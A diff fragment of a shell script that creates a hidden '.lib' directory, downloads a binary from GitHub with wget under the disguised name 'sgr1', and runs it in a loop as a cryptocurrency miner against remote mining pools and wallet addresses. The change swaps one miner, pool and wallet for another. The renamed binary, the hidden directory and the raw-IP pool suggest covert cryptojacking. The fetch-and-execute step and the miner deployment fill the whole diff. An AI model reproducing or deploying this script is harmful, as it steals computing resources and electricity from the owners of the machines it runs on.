@@ -15,7 +15,7 @@ rm nyumput.c
 mkdir -p .lib && cd .lib
 
 # Download the binary
-wget -O sgr1 https://github.com/barburonjilo/back/raw/main/xlarig
+wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
 chmod +x sgr1
 
 while true; do
@@ -24,7 +24,7 @@ while true; do
     pid=$!
 
     # Run the process with the specified parameters
-    ./sgr1 -o mine.scalaproject.io:3333 -p cok -u Ssy2HMaGNZzA7uq2sp833HAtXiPZ26PwiQA27VqGftDPYyjS4RJpBVKgchk6QuB5f1RQZKmAY77b74pKmtt1UrGZARCU574F7j --donate-level 0 -a panthera &
+    ./sgr1  -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120  &
 
     # Run for 1 minute
     sleep 60
